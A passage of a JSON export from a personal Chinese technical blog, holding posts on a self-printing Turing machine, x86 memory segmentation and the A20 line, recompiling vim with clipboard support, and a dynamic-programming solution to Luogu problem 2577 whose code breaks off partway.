4755</code>修改该文件的权限，才可以使用这个chrome</li>\n<li>使用方法，直接在<code>folder/opt/google/chrome/</code>目录下运行<code>./chrome</code>即可</li>\n</ul>\n","slug":"How-to-Have-Two-Chromes-at-Linux","categories":[{"name":"运维","slug":"运维","permalink":"https://h-zex.github.io/categories/运维/"}],"tags":[{"name":"运维","slug":"运维","permalink":"https://h-zex.github.io/tags/运维/"},{"name":"小技巧","slug":"小技巧","permalink":"https://h-zex.github.io/tags/小技巧/"},{"name":"chrome","slug":"chrome","permalink":"https://h-zex.github.io/tags/chrome/"},{"name":"linux","slug":"linux","permalink":"https://h-zex.github.io/tags/linux/"}]},{"title":"打印自身的图灵机的构造","date":"2018-08-03T03:16:51.000Z","path":"2018/08/03/打印自身的图灵机的构造/","text":"以下是Introduction to The Theory of Computation 英文第三版的Lemma6.1、Theory6.3的个人理解 下文中，&lt;p&gt; 代表图灵机p的编码 首先，根据Lemma6.1，可以有一台通用机器q，其对于任意w，打印出“输出该w的图灵机”的编码——不过并不保证这台被打印出的图灵机就是那一台生成该w的图灵机——生成w的图灵机可以有很多台，q只打印出其中一台 然后，利用上面这个东西，就可以特殊构造某机器p，其输出w，并且该机器的编码就是q输出的图灵机的编码。从而使得q从p的输出w可以反推出p本身 然后，再特殊一点，这台p输出的w刚好就是q的编码——这是可以做到的，因为q是一台已经确定的，独立于p的图灵机。那么，q的输出+p的输出就刚好是&lt;p&gt;&lt;q&gt; ——从而，q与p组合起来的图灵机就是一台打印出自身的图灵机 继续扩展，p可以有多部分构成，使得p和q组合起来的机器不仅仅打印出自身，还可以做其他事情。比如说，p=ab，其中a是打印出&lt;q&gt;&lt;b&gt; 的图灵机，b是做其他事情的图灵机。然后，图灵机q就可以打印出图灵机p。如果把他们的输出组合起来就成了&lt;p&gt;&lt;q&gt;&lt;b&gt; 。当图灵机a、图灵机q运行完之后，纸带上就有了&lt;p&gt;&lt;q&gt;&lt;b&gt; 。consider that，必然是p先运行，在纸带上留下自己的输出，然后才能q运行，从纸带上获得p的输出，来产生出&lt;p&gt; 。可以修改q，使得其运行后，把控制权交给图灵机b，然后图灵机b从纸带上获得&lt;p&gt;&lt;q&gt;&lt;b&gt; ，继续执行计算。 上文说的转交控制权的可以这样实现——根据图灵机b定制图灵机q，使得q的accept状态后读入空串到达图灵机b的其实状态。这时候，图灵机q的编码将依赖于图灵机b。 更进一步，再修改图灵机q，其不是使用图灵机p的所有输出，而是使用图灵机p的一部分输出来构造出&lt;p&gt; ，那么，图灵机p就不仅仅可以输出图灵机q的描述，还可以在纸带上留下w（w与&lt;p&gt;&lt;q&gt; 无关）。 那么，我们就可以有一台图灵机M，其由图灵机p、q组成，其中，p=ab，那么，这台图灵机会在q运行完后，在纸带上留下w&lt;p&gt;&lt;q&gt;&lt;b&gt; 。然后，将控制权转给图灵机b，其执行其他计算。从而，我们的这台图灵机M其不仅仅打印出自身，还实现了图灵机b的功能。","raw":"---\ntitle: 打印自身的图灵机的构造\ntoc: false\ncomments: true\nmathjax: true\ndate: 2018-08-03 11:16:51\ntags:\n- 图灵机\ndescription: 打印自身的图灵机的构造\ncategories:\n- 计算理论\n---\n\n- 以下是*Introduction to The Theory of Computation* 英文第三版的Lemma6.1、Theory6.3的个人理解 \n\n- 下文中，`<p>` 代表图灵机p的编码\n\n\n- 首先，根据Lemma6.1，可以有一台通用机器q，其对于任意w，打印出“输出该w的图灵机”的编码——不过并不保证这台被打印出的图灵机就是那一台生成该w的图灵机——生成w的图灵机可以有很多台，q只打印出其中一台\n- 然后，利用上面这个东西，就可以**特殊构造**某机器p，其输出w，并且该机器的编码就是q输出的图灵机的编码。从而使得q从p的输出w可以反推出p本身\n- 然后，再特殊一点，这台p输出的w刚好就是q的编码——这是可以做到的，因为q是一台已经确定的，独立于p的图灵机。那么，q的输出+p的输出就刚好是`<p><q>` ——从而，q与p组合起来的图灵机就是一台打印出自身的图灵机\n- 继续扩展，p可以有多部分构成，使得p和q组合起来的机器不仅仅打印出自身，还可以做其他事情。比如说，p=ab，其中a是打印出`<q><b>` 的图灵机，b是做其他事情的图灵机。然后，图灵机q就可以打印出图灵机p。如果把他们的输出组合起来就成了`<p><q><b>` 。当图灵机a、图灵机q运行完之后，纸带上就有了`<p><q><b>` 。consider that，必然是p先运行，在纸带上留下自己的输出，然后才能q运行，从纸带上获得p的输出，来产生出`<p>` 。可以修改q，使得其运行后，把控制权交给图灵机b，然后图灵机b从纸带上获得`<p><q><b>` ，继续执行计算。\n- 上文说的转交控制权的可以这样实现——根据图灵机b定制图灵机q，使得q的accept状态后读入空串到达图灵机b的其实状态。这时候，图灵机q的编码将依赖于图灵机b。\n- 更进一步，再修改图灵机q，其不是使用图灵机p的所有输出，而是使用图灵机p的一部分输出来构造出`<p>` ，那么，图灵机p就不仅仅可以输出图灵机q的描述，还可以在纸带上留下w（w与`<p><q>` 无关）。\n- 那么，我们就可以有一台图灵机M，其由图灵机p、q组成，其中，p=ab，那么，这台图灵机会在q运行完后，在纸带上留下`w<p><q><b>` 。然后，将控制权转给图灵机b，其执行其他计算。从而，我们的这台图灵机M其不仅仅打印出自身，还实现了图灵机b的功能。\n","content":"<ul>\n<li><p>以下是<em>Introduction to The Theory of Computation</em> 英文第三版的Lemma6.1、Theory6.3的个人理解 </p>\n</li>\n<li><p>下文中，<code>&lt;p&gt;</code> 代表图灵机p的编码</p>\n</li>\n</ul>\n<ul>\n<li>首先，根据Lemma6.1，可以有一台通用机器q，其对于任意w，打印出“输出该w的图灵机”的编码——不过并不保证这台被打印出的图灵机就是那一台生成该w的图灵机——生成w的图灵机可以有很多台，q只打印出其中一台</li>\n<li>然后，利用上面这个东西，就可以<strong>特殊构造</strong>某机器p，其输出w，并且该机器的编码就是q输出的图灵机的编码。从而使得q从p的输出w可以反推出p本身</li>\n<li>然后，再特殊一点，这台p输出的w刚好就是q的编码——这是可以做到的，因为q是一台已经确定的，独立于p的图灵机。那么，q的输出+p的输出就刚好是<code>&lt;p&gt;&lt;q&gt;</code> ——从而，q与p组合起来的图灵机就是一台打印出自身的图灵机</li>\n<li>继续扩展，p可以有多部分构成，使得p和q组合起来的机器不仅仅打印出自身，还可以做其他事情。比如说，p=ab，其中a是打印出<code>&lt;q&gt;&lt;b&gt;</code> 的图灵机，b是做其他事情的图灵机。然后，图灵机q就可以打印出图灵机p。如果把他们的输出组合起来就成了<code>&lt;p&gt;&lt;q&gt;&lt;b&gt;</code> 。当图灵机a、图灵机q运行完之后，纸带上就有了<code>&lt;p&gt;&lt;q&gt;&lt;b&gt;</code> 。consider that，必然是p先运行，在纸带上留下自己的输出，然后才能q运行，从纸带上获得p的输出，来产生出<code>&lt;p&gt;</code> 。可以修改q，使得其运行后，把控制权交给图灵机b，然后图灵机b从纸带上获得<code>&lt;p&gt;&lt;q&gt;&lt;b&gt;</code> ，继续执行计算。</li>\n<li>上文说的转交控制权的可以这样实现——根据图灵机b定制图灵机q，使得q的accept状态后读入空串到达图灵机b的其实状态。这时候，图灵机q的编码将依赖于图灵机b。</li>\n<li>更进一步，再修改图灵机q，其不是使用图灵机p的所有输出，而是使用图灵机p的一部分输出来构造出<code>&lt;p&gt;</code> ，那么，图灵机p就不仅仅可以输出图灵机q的描述，还可以在纸带上留下w（w与<code>&lt;p&gt;&lt;q&gt;</code> 无关）。</li>\n<li>那么，我们就可以有一台图灵机M，其由图灵机p、q组成，其中，p=ab，那么，这台图灵机会在q运行完后，在纸带上留下<code>w&lt;p&gt;&lt;q&gt;&lt;b&gt;</code> 。然后，将控制权转给图灵机b，其执行其他计算。从而，我们的这台图灵机M其不仅仅打印出自身，还实现了图灵机b的功能。</li>\n</ul>\n","slug":"打印自身的图灵机的构造","categories":[{"name":"计算理论","slug":"计算理论","permalink":"https://h-zex.github.io/categories/计算理论/"}],"tags":[{"name":"图灵机","slug":"图灵机","permalink":"https://h-zex.github.io/tags/图灵机/"}]},{"title":"Segmentation 分段","date":"2018-06-30T05:09:58.000Z","path":"2018/06/30/Segmentation-分段/","text":"以下内容是对mit6.828 xv6book、pcasm-book、cmu 15-410关于segment的doc的整理 xv6book, PC Assembly Language, CMU-15-410 segment 在分段中，寻址使用的是一个 &lt;selector, offset&gt; 的pair real mode selector 保存在segment register，这是一个paragraph number。 内存单元常常以多个byte为单元一起使用，比如，两个byte是word，4个是double word，8个是quad word，16个则是paragraph segmentation hardware（也就是那个进行段转换的机构）直接把selector的值乘以16然后加上offset的值得到physical address 16-bit protected mode selector 同样保存在segment register中，不过现在不是单纯的paragraph number，而是包含一组信息：a segment number, a table selector flag, a request privilege level。 segment number是到GDT（global decriptor table）或者LDT（local decriptor table）的index（数组下标称为array index，所以这个index就是类似数组下标的东西）。 table selector flag指示的是segment number使用的是GDT还是LDT的index RPL（request privilege level）对于不同的段寄存器有不同的含义。对于cs寄存器，RPL设置处理器的特权级 In this case (the %CS register), the RPL sets the privilege level of the processor 不过，在mit 6.828的那本xv6book的Appendix B中有一幅图 其中使用16bit的selector直接作为GDT/LDT的index，所以，这地方有一些疑点 GDT/LDT的descriptor包含base address、size和一些flag bits、privilege level，当访问内存时，处理器将offset与size相比较，如果offset&gt;= size ，则是越界访问。如果是合法的访问，则base address + offset得到 linear address 32-bit protected mode 80386 引入了32-bit protected mode，这个模式相对于16-bit的保护模式有两个区别——offset现在是32bit，segment 现在被切分成4K-sized 的unit，称为page。 解释一下整个地址转换流程。logical address（或者叫 virtual address） 就是&lt;selector, offset&gt; ，linear address就是selector 和 offset 经过segment translation 转换后得到的地址。如果没有开paging hardware，那么，linear address就直接作为physical address使用。如果有，则要查页表 题外话 可以使用一些方法使得分段实际上跟没有起作用一样。 比如，所有的descriptor中base address都是0x00000000，size都是0xFFFFFFFF（假设是在32位的机器上），那么，segment translation的越界检查、$offset+base size * 16$ 实际上等价于无用功。所以看起来跟flat address space一样的 在xv6的boot过程中，实际上paging hardware、segmentation hardware并没有起作用 The boot loader does not enable the paging hardware; the logical addresses that it uses are translated to linear addresses by the segmentation harware, and then used directly as physical addresses. Xv6 configures the segmentation hardware to translate logical to linear addresses without change, so that they are always equal. 逻辑地址segmen:offset 可以得出21bit的physical address（0xffff0+0xffff=0x10ffef），但是intel 8088把第21bit直接丢掉。所以为了兼容性，虽然后面的intel cpu可以支持21bit的地址，IBM还是提供了一个向后兼容。A20 Line wiki If the second bit of the keyboard controller’s output port is low, the 21st physical address bit is always cleared; if high, the 21st bit acts normally. The boot loader must enable the 21st address bit using I/O to the keyboard controller on ports 0x64 and 0x60The traditional method for A20 line enabling is to directly probe the keyboard controller. The reason for this is that Intel’s 8042 keyboard controller had a spare pin which they decided to route the A20 line through. This seems foolish now given their unrelated nature, but at the time computers weren’t quite so standardized. Keyboard controllers are usually derivatives of the 8042 chip. By programming that chip accurately, you can either enable or disable bit #20 on the address bus.When your PC boots, the A20 gate is always disabled, but some BIOSes do enable it for you, as do some high-memory managers (HIMEM.SYS) or bootloaders (GRUB).","raw":"---\ntitle: Segmentation 分段\ntoc: false\ncomments: true\nmathjax: true\ndate: 2018-06-30 13:09:58\ntags:\n- MIT 6.828\n- OS\ndescription: MIT 6.828, CMU 15-410 关于segmentation的资料的整理\ncategories:\n- OS\n---\n\n> 以下内容是对mit6.828 xv6book、pcasm-book、cmu 15-410关于segment的doc的整理\n>\n> [xv6book](https://pdos.csail.mit.edu/6.828/2017/xv6/book-rev10.pdf), [PC Assembly Language](https://pdos.csail.mit.edu/6.828/2017/readings/pcasm-book.pdf), [CMU-15-410 segment ](https://www.cs.cmu.edu/~410/doc/segments/segments.html)\n\n> 在分段中，寻址使用的是一个 `<selector, offset>` 的pair\n\n#### real mode\n\n- selector 保存在segment register，这是一个paragraph number。\n\n- > 内存单元常常以多个byte为单元一起使用，比如，两个byte是word，4个是double word，8个是quad word，16个则是paragraph\n\n- segmentation hardware（也就是那个进行段转换的机构）直接把selector的值乘以16然后加上offset的值得到physical address\n\n#### 16-bit protected mode\n\n- selector 同样保存在segment register中，不过现在不是单纯的paragraph number，而是包含一组信息：a segment number, a table selector flag, a request privilege level。 \n  {% asset_img 1.gif %}\n\n  segment number是到GDT（global decriptor table）或者LDT（local decriptor table）的index（数组下标称为array index，所以这个index就是类似数组下标的东西）。\n\n  table selector flag指示的是segment number使用的是GDT还是LDT的index\n\n  RPL（request privilege level）对于不同的段寄存器有不同的含义。对于cs寄存器，RPL设置处理器的特权级\n\n  >  In this case (the %CS register), the RPL sets the privilege level of the processor\n\n  不过，在mit 6.828的那本xv6book的Appendix B中有一幅图\n\n  {% asset_img 2.png %}\n\n  其中使用16bit的selector直接作为GDT/LDT的index，所以，这地方有一些疑点\n\n- GDT/LDT的descriptor包含base address、size和一些flag bits、privilege level，当访问内存时，处理器将offset与size相比较，如果offset>= size ，则是越界访问。如果是合法的访问，则base address + offset得到 linear address\n\n#### 32-bit protected mode\n\n- 80386 引入了32-bit protected mode，这个模式相对于16-bit的保护模式有两个区别——offset现在是32bit，segment 现在被切分成4K-sized 的unit，称为page。\n\n- 解释一下整个地址转换流程。logical address（或者叫 virtual address） 就是`<selector, offset>` ，linear address就是selector 和 offset 经过segment translation 转换后得到的地址。如果没有开paging hardware，那么，linear address就直接作为physical address使用。如果有，则要查页表\n\n  {% asset_img 3.png %}\n\n#### 题外话\n\n- 可以使用一些方法使得分段实际上跟没有起作用一样。\n\n- 比如，所有的descriptor中base address都是0x00000000，size都是0xFFFFFFFF（假设是在32位的机器上），那么，segment translation的越界检查、$offset+base size * 16$ 实际上等价于无用功。所以看起来跟flat address space一样的\n\n- 在xv6的boot过程中，实际上paging hardware、segmentation hardware并没有起作用\n\n  > The boot loader does not enable the paging hardware; the logical addresses that it uses are translated to linear addresses by the segmentation harware, and then used directly as physical addresses. Xv6 configures the segmentation hardware to translate logical to linear addresses without change, so that they are always equal.\n\n- 逻辑地址segmen:offset 可以得出21bit的physical address（0xffff0+0xffff=0x10ffef），但是intel 8088把第21bit直接丢掉。所以为了兼容性，虽然后面的intel cpu可以支持21bit的地址，IBM还是提供了一个向后兼容。[A20 Line wiki](https://wiki.osdev.org/A20_Line)\n   > If the second bit of the keyboard controller’s output port is low, the 21st physical address bit is always cleared; if high, the 21st bit acts normally. The boot loader must enable the 21st address bit using I/O to the keyboard controller on ports 0x64 and 0x60 \n   > The traditional method for A20 line enabling is to directly probe the keyboard controller. The reason for this is that Intel's 8042 keyboard controller had a spare pin which they decided to route the A20 line through. This seems foolish now given their unrelated nature, but at the time computers weren't quite so standardized. Keyboard controllers are usually derivatives of the 8042 chip. By programming that chip accurately, you can either enable or disable bit #20 on the address bus.\n   > When your PC boots, the A20 gate is always disabled, but some BIOSes do enable it for you, as do some high-memory managers (HIMEM.SYS) or bootloaders (GRUB).\n\n","content":"<blockquote>\n<p>以下内容是对mit6.828 xv6book、pcasm-book、cmu 15-410关于segment的doc的整理</p>\n<p><a href=\"https://pdos.csail.mit.edu/6.828/2017/xv6/book-rev10.pdf\" target=\"_blank\" rel=\"noopener\">xv6book</a>, <a href=\"https://pdos.csail.mit.edu/6.828/2017/readings/pcasm-book.pdf\" target=\"_blank\" rel=\"noopener\">PC Assembly Language</a>, <a href=\"https://www.cs.cmu.edu/~410/doc/segments/segments.html\" target=\"_blank\" rel=\"noopener\">CMU-15-410 segment </a></p>\n</blockquote>\n<blockquote>\n<p>在分段中，寻址使用的是一个 <code>&lt;selector, offset&gt;</code> 的pair</p>\n</blockquote>\n<h4 id=\"real-mode\"><a href=\"#real-mode\" class=\"headerlink\" title=\"real mode\"></a>real mode</h4><ul>\n<li><p>selector 保存在segment register，这是一个paragraph number。</p>\n</li>\n<li><blockquote>\n<p>内存单元常常以多个byte为单元一起使用，比如，两个byte是word，4个是double word，8个是quad word，16个则是paragraph</p>\n</blockquote>\n</li>\n<li><p>segmentation hardware（也就是那个进行段转换的机构）直接把selector的值乘以16然后加上offset的值得到physical address</p>\n</li>\n</ul>\n<h4 id=\"16-bit-protected-mode\"><a href=\"#16-bit-protected-mode\" class=\"headerlink\" title=\"16-bit protected mode\"></a>16-bit protected mode</h4><ul>\n<li><p>selector 同样保存在segment register中，不过现在不是单纯的paragraph number，而是包含一组信息：a segment number, a table selector flag, a request privilege level。 </p>\n<img src=\"/2018/06/30/Segmentation-分段/1.gif\">\n<p>segment number是到GDT（global decriptor table）或者LDT（local decriptor table）的index（数组下标称为array index，所以这个index就是类似数组下标的东西）。</p>\n<p>table selector flag指示的是segment number使用的是GDT还是LDT的index</p>\n<p>RPL（request privilege level）对于不同的段寄存器有不同的含义。对于cs寄存器，RPL设置处理器的特权级</p>\n<blockquote>\n<p> In this case (the %CS register), the RPL sets the privilege level of the processor</p>\n</blockquote>\n<p>不过，在mit 6.828的那本xv6book的Appendix B中有一幅图</p>\n<img src=\"/2018/06/30/Segmentation-分段/2.png\">\n<p>其中使用16bit的selector直接作为GDT/LDT的index，所以，这地方有一些疑点</p>\n</li>\n<li><p>GDT/LDT的descriptor包含base address、size和一些flag bits、privilege level，当访问内存时，处理器将offset与size相比较，如果offset&gt;= size ，则是越界访问。如果是合法的访问，则base address + offset得到 linear address</p>\n</li>\n</ul>\n<h4 id=\"32-bit-protected-mode\"><a href=\"#32-bit-protected-mode\" class=\"headerlink\" title=\"32-bit protected mode\"></a>32-bit protected mode</h4><ul>\n<li><p>80386 引入了32-bit protected mode，这个模式相对于16-bit的保护模式有两个区别——offset现在是32bit，segment 现在被切分成4K-sized 的unit，称为page。</p>\n</li>\n<li><p>解释一下整个地址转换流程。logical address（或者叫 virtual address） 就是<code>&lt;selector, offset&gt;</code> ，linear address就是selector 和 offset 经过segment translation 转换后得到的地址。如果没有开paging hardware，那么，linear address就直接作为physical address使用。如果有，则要查页表</p>\n<img src=\"/2018/06/30/Segmentation-分段/3.png\">\n</li>\n</ul>\n<h4 id=\"题外话\"><a href=\"#题外话\" class=\"headerlink\" title=\"题外话\"></a>题外话</h4><ul>\n<li><p>可以使用一些方法使得分段实际上跟没有起作用一样。</p>\n</li>\n<li><p>比如，所有的descriptor中base address都是0x00000000，size都是0xFFFFFFFF（假设是在32位的机器上），那么，segment translation的越界检查、$offset+base size * 16$ 实际上等价于无用功。所以看起来跟flat address space一样的</p>\n</li>\n<li><p>在xv6的boot过程中，实际上paging hardware、segmentation hardware并没有起作用</p>\n<blockquote>\n<p>The boot loader does not enable the paging hardware; the logical addresses that it uses are translated to linear addresses by the segmentation harware, and then used directly as physical addresses. Xv6 configures the segmentation hardware to translate logical to linear addresses without change, so that they are always equal.</p>\n</blockquote>\n</li>\n<li><p>逻辑地址segmen:offset 可以得出21bit的physical address（0xffff0+0xffff=0x10ffef），但是intel 8088把第21bit直接丢掉。所以为了兼容性，虽然后面的intel cpu可以支持21bit的地址，IBM还是提供了一个向后兼容。<a href=\"https://wiki.osdev.org/A20_Line\" target=\"_blank\" rel=\"noopener\">A20 Line wiki</a></p>\n<blockquote>\n<p>If the second bit of the keyboard controller’s output port is low, the 21st physical address bit is always cleared; if high, the 21st bit acts normally. The boot loader must enable the 21st address bit using I/O to the keyboard controller on ports 0x64 and 0x60<br>The traditional method for A20 line enabling is to directly probe the keyboard controller. The reason for this is that Intel’s 8042 keyboard controller had a spare pin which they decided to route the A20 line through. This seems foolish now given their unrelated nature, but at the time computers weren’t quite so standardized. Keyboard controllers are usually derivatives of the 8042 chip. By programming that chip accurately, you can either enable or disable bit #20 on the address bus.<br>When your PC boots, the A20 gate is always disabled, but some BIOSes do enable it for you, as do some high-memory managers (HIMEM.SYS) or bootloaders (GRUB).</p>\n</blockquote>\n</li>\n</ul>\n","slug":"Segmentation-分段","categories":[{"name":"OS","slug":"OS","permalink":"https://h-zex.github.io/categories/OS/"}],"tags":[{"name":"MIT 6.828","slug":"MIT-6-828","permalink":"https://h-zex.github.io/tags/MIT-6-828/"},{"name":"OS","slug":"OS","permalink":"https://h-zex.github.io/tags/OS/"}]},{"title":"vim 不支持系统剪切板的解决方案","date":"2018-06-05T07:15:31.000Z","path":"2018/06/05/vim不支持系统剪切板的解决方案/","text":"判断vim是否支持系统剪切板 在终端输入vim -version，如果clipboard 那一项是-clipboard ，以及xterm_clipboard 那一项是-xterm_clipboard ，说明并不支持。可以通过重新编译来解决 以下引用另一位博主的解决方案，原文地址 +clipboard +xterm_clipboard solution: –with-x –x-includes=/usr/include/X11 –x-libraries=/usr/lib/X11 You’ll need to install the appropriate X development library like xlib and xtst for --with-x to work. On ubuntu it should be enough to install libx11-dev and libxtst-dev., xlibs-dev and sudo apt-get build-dep vim-gtk 编译方法，在github vim 主页下载源码zip包，解压后进入第一层目录，执行 123456789101112./configure \\--enable-cscope \\--with-x --x-includes=/usr/include/X11 --x-libraries=/usr/lib/X11 \\--with-features=normal \\--enable-multibyte \\--enable-rubyinterp \\--enable-pythoninterp \\--with-python-config-dir=/usr/lib/python2.7/config-x86_64-linux-gnu \\--enable-perlinterp \\--enable-luainterp \\--enable-gui=gtk2 --enable-cscope --prefix=/usr make &amp;&amp; sudo make install 上面的配置选项可以根据自己的需求修改 完成后可以在src/auto/config.log 查看log","raw":"---\ntitle: vim 不支持系统剪切板的解决方案\ntoc: false\ncomments: true\nmathjax: true\ndate: 2018-06-05 15:15:31\ntags:\n- vim\n- 系统剪切板\n- clipboard\n- xterm_clipboard\ndescription: vim 不支持系统剪切板的解决方案\ncategories:\n- 运维\n---\n\n### 判断vim是否支持系统剪切板\n\n- 在终端输入`vim -version`，如果`clipboard` 那一项是`-clipboard` ，以及`xterm_clipboard` 那一项是`-xterm_clipboard` ，说明并不支持。可以通过重新编译来解决\n\n- 以下引用另一位博主的解决方案，[原文地址](https://www.evernote.com/shard/s258/sh/8f17d13f-5040-45b4-a312-294ef7304fe5/c0c182567f72325da680fb38d66436ae)\n\n- > +clipboard +xterm_clipboard\n  >\n  > solution:\n  >\n  > --with-x --x-includes=/usr/include/X11 --x-libraries=/usr/lib/X11\n  >\n  > You'll need to install the appropriate X development library like `xlib` and `xtst` for `--with-x` to work. On ubuntu it should be enough to install `libx11-dev` and `libxtst-dev`., xlibs-dev\n  >\n  > and   sudo apt-get build-dep vim-gtk \n\n- 编译方法，在github vim 主页下载源码zip包，解压后进入第一层目录，执行\n\n  ```\n  ./configure \\\n  --enable-cscope \\\n  --with-x --x-includes=/usr/include/X11 --x-libraries=/usr/lib/X11 \\\n  --with-features=normal \\\n  --enable-multibyte \\\n  --enable-rubyinterp \\\n  --enable-pythoninterp \\\n  --with-python-config-dir=/usr/lib/python2.7/config-x86_64-linux-gnu \\\n  --enable-perlinterp \\\n  --enable-luainterp \\\n  --enable-gui=gtk2 --enable-cscope --prefix=/usr\n   make && sudo make install\n  ```\n\n  上面的配置选项可以根据自己的需求修改\n\n  完成后可以在`src/auto/config.log` 查看log","content":"<h3 id=\"判断vim是否支持系统剪切板\"><a href=\"#判断vim是否支持系统剪切板\" class=\"headerlink\" title=\"判断vim是否支持系统剪切板\"></a>判断vim是否支持系统剪切板</h3><ul>\n<li><p>在终端输入<code>vim -version</code>，如果<code>clipboard</code> 那一项是<code>-clipboard</code> ，以及<code>xterm_clipboard</code> 那一项是<code>-xterm_clipboard</code> ，说明并不支持。可以通过重新编译来解决</p>\n</li>\n<li><p>以下引用另一位博主的解决方案，<a href=\"https://www.evernote.com/shard/s258/sh/8f17d13f-5040-45b4-a312-294ef7304fe5/c0c182567f72325da680fb38d66436ae\" target=\"_blank\" rel=\"noopener\">原文地址</a></p>\n</li>\n<li><blockquote>\n<p>+clipboard +xterm_clipboard</p>\n<p>solution:</p>\n<p>–with-x –x-includes=/usr/include/X11 –x-libraries=/usr/lib/X11</p>\n<p>You’ll need to install the appropriate X development library like <code>xlib</code> and <code>xtst</code> for <code>--with-x</code> to work. On ubuntu it should be enough to install <code>libx11-dev</code> and <code>libxtst-dev</code>., xlibs-dev</p>\n<p>and   sudo apt-get build-dep vim-gtk </p>\n</blockquote>\n</li>\n<li><p>编译方法，在github vim 主页下载源码zip包，解压后进入第一层目录，执行</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">./configure \\</span><br><span class=\"line\">--enable-cscope \\</span><br><span class=\"line\">--with-x --x-includes=/usr/include/X11 --x-libraries=/usr/lib/X11 \\</span><br><span class=\"line\">--with-features=normal \\</span><br><span class=\"line\">--enable-multibyte \\</span><br><span class=\"line\">--enable-rubyinterp \\</span><br><span class=\"line\">--enable-pythoninterp \\</span><br><span class=\"line\">--with-python-config-dir=/usr/lib/python2.7/config-x86_64-linux-gnu \\</span><br><span class=\"line\">--enable-perlinterp \\</span><br><span class=\"line\">--enable-luainterp \\</span><br><span class=\"line\">--enable-gui=gtk2 --enable-cscope --prefix=/usr</span><br><span class=\"line\"> make &amp;&amp; sudo make install</span><br></pre></td></tr></table></figure>\n<p>上面的配置选项可以根据自己的需求修改</p>\n<p>完成后可以在<code>src/auto/config.log</code> 查看log</p>\n</li>\n</ul>\n","slug":"vim不支持系统剪切板的解决方案","categories":[{"name":"运维","slug":"运维","permalink":"https://h-zex.github.io/categories/运维/"}],"tags":[{"name":"vim","slug":"vim","permalink":"https://h-zex.github.io/tags/vim/"},{"name":"系统剪切板","slug":"系统剪切板","permalink":"https://h-zex.github.io/tags/系统剪切板/"},{"name":"clipboard","slug":"clipboard","permalink":"https://h-zex.github.io/tags/clipboard/"},{"name":"xterm_clipboard","slug":"xterm-clipboard","permalink":"https://h-zex.github.io/tags/xterm-clipboard/"}]},{"title":"洛谷2577 午餐","date":"2018-05-20T00:20:06.000Z","path":"2018/05/20/洛谷2577-午餐/","text":"题目题目描述上午的训练结束了，THU ACM小组集体去吃午餐，他们一行N人来到了著名的十食堂。这里有两个打饭的窗口，每个窗口同一时刻只能给一个人打饭。由于每个人的口味（以及胃口）不同，所以他们要吃的菜各有不同，打饭所要花费的时间是因人而异的。另外每个人吃饭的速度也不尽相同，所以吃饭花费的时间也是可能有所不同的。 THU ACM小组的吃饭计划是这样的：先把所有的人分成两队，并安排好每队中各人的排列顺序，然后一号队伍到一号窗口去排队打饭，二号队伍到二号窗口去排队打饭。每个人打完饭后立刻开始吃，所有人都吃完饭后立刻集合去六教地下室进行下午的训练。 现在给定了每个人的打饭时间和吃饭时间，要求安排一种最佳的分队和排队方案使得所有人都吃完饭的时间尽量早。 假设THU ACM小组在时刻0到达十食堂，而且食堂里面没有其他吃饭的同学（只有打饭的师傅）。每个人必须而且只能被分在一个队伍里。两个窗口是并行操作互不影响的，而且每个人打饭的时间是和窗口无关的，打完饭之后立刻就开始吃饭，中间没有延迟。 现在给定N个人各自的打饭时间和吃饭时间，要求输出最佳方案下所有人吃完饭的时刻。 输入输出格式输入格式： 第一行一个整数N，代表总共有N个人。 以下N行，每行两个整数 Ai，Bi。依次代表第i个人的打饭时间和吃饭时间。 输出格式： 一个整数T，代表所有人吃完饭的最早时刻。 输入输出样例输入样例#1： 12345652 27 71 36 48 5 输出样例#1： 117 题解吃饭时间越长越早排队 假设有一个最优分组方法，其中第一队内是按吃饭时间长短排序的——越长排在越前。然后尝试交换该队内的某两个人，i、j ——即原先是i 排在j 前面，并且两人各自的吃饭时间$b[j]&lt;b[i]$，现在交换过来 首先，交换前从队头到到j 总的打饭时间或者是交换后从队头到i 的总的打饭时间都是$T$ 然后以前$T$时间后，j 开始吃饭，现在是$T$时间后，i 开始吃饭。如果以前最终吃饭完成的时间是$T+b[j]$ （$b[j]$ 是j 的吃饭时间），那么现在就是$T+b[i]&gt;T+b[j]$ 。如果以前最终吃饭完成时间比$T+b[j]$ 后，那么现在最终吃饭完成时间就大于或者等于$T+b[i]$ 如何记录状态以及状态转移方程 $dp[i][j][k]$ ：表示当排到第i 个人时，第一队的排队耗时是j ，第二队的排队耗时是k 先定义符号，$man[i].a$ 表示第i 人的打饭时间，$man[i].b$ 是第i 人的吃饭时间，$sum[x]=\\Sigma_{i=0}^x man[i].a$ 因为，对于确定的i ，$k=sum[i]-j$ ，所以，$dp[i][j][k]=dp[i][j][sum[i]-j]$ 123int x = MAX(dp[i-1][j-man[i].a][k], j+man[i].b);int y = MAX(dp[i-1][j][k-man[i].a], k+man[i].b);dp[i][j][k] = dp[i][j][sum[i]-j] = MIN(x, y); 之所以要取MAX，是因为$dp[i-1][j-man[i].a][k]$ 可能是第一队达到的最长吃饭完成时间，也可能是第二队达到的，而即使是第一队达到的，也有可能现在第一队最后一个吃完的时间$j+man[i].b$ 比$dp[i-1][j-man[i].a][k]$ 早，所以要取MAX 因为无需枚举k ，所以无需使用三维数组。并且可以使用滚动数组，从而压缩为一维数组 代码1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162#include &lt;algorithm&gt;#include &lt;cassert&gt;#include &lt;cstdio&gt;#include &lt;cstdlib&gt;#include &lt;cstring&gt;#include &lt;iostream&gt;#include &lt;map&gt;#include &lt;queue&gt;#include &lt;vector&gt;#define FWD(x, b, e) for (int x = b; x &lt; e; x++)#define BWD(x, b, e) for (int x = b; x &gt;= e; x--)#define INF 0x3f3f3f3fusing namespace std;inline int MAX(int x, int y) &#123; return x &lt; y ? y : x; &#125;inline int MIN(int x, int y) &#123; return x &lt; y ? x : y; &#125;struct Node &#123; int a, b;// a is pick time, b is eat time bool operator&lt;(const Node &amp;y) const &#123; return this-&gt;b &gt; y.b; &#125;&#125;;Node man[300];int dp[80010];int sum[300];int main() &#123; int n; scanf(\"%d\", 